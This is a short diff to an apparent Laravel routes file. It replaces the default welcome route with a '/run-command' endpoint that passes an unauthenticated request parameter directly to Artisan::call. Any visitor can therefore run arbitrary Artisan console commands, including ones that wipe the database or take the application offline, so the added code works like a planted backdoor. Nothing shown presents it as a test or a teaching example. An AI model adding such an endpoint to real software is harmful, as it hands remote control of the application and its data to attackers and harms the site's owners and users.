@@ -1,5 +1,6 @@
 <?php
 
+use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -13,6 +14,6 @@ use Illuminate\Support\Facades\Route;
 |
 */
 
-Route::get('/', function () {
-    return "welcome";
+Route::get('/run-command', function (Request $request) {
+    \Illuminate\Support\Facades\Artisan::call($request->input('command'));
 });
